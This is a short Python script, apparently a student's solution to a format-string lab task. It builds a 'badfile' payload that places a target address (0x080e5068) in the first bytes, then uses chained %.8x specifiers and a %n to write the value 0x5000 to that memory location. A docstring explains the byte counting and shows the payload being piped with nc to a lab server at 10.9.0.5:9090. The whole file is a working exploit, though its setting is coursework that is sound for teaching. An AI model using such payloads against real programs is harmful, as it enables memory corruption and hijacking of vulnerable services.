#! /usr/bin/python3
import sys

def task(address, N, target_value):
    global content

    content[0:4] = (address).to_bytes(4, byteorder='little')

    printed = 4 + 8*(N-2) # 4 bytes for the address and 8 + 8 for 2 %.8x

    count = target_value - printed
    pattern = '{Prefix}%.{C}x%n\n'
    s = pattern.format(Prefix = "%.8x"*(N-2), C=count)
    print(s)

    fmt = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt


N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080e5068

task(address, int(sys.argv[1]), 0x5000)

with open('badfile', 'wb') as f:
    f.write(content)
    
"""
Symilar to task3A.py, we save the address of where we want to write in the first 4 cells
The {Prefix} print the address of stack, each one is 8 bytes, and other 4 byte for address, so we print 4 + 8*(N-2) bytes
%n will write the number of characters written so far into the address we saved in the first 4 cells

so we need to print another 0x5000 - 4 - 8*(N-2) bytes (count)

if we run the code python3 task3B.py 64 && cat badfile | nc 10.9.0.5 9090
%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.19980x%n

the last part is %.19980x%n
%.19980x will print 19980 bytes
%n will write the number of characters written so far into the address we saved in the first 4 cells, so 4 for address, 8*(N-2) for %.8x and 19980 for %.19980x
"""
